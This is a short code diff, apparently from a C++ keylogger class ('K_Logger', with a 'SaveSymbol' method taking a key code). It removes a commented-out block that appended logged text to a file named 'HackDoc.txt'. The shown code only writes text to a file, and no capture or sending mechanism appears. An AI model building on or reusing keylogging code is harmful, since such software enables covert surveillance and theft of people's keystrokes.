@@ -36,10 +36,6 @@ void K_Logger::WriteToDoc(LPCSTR text)
 	doc_to << text;
 	doc_to.close();
 	/***********************************************************************************************************/
-
-	/*doc_to.open("HackDoc.txt", std::fstream::app);
-	doc_to << text;
-	doc_to.close();*/
 }
 
 int K_Logger::SaveSymbol(WORD iKey)
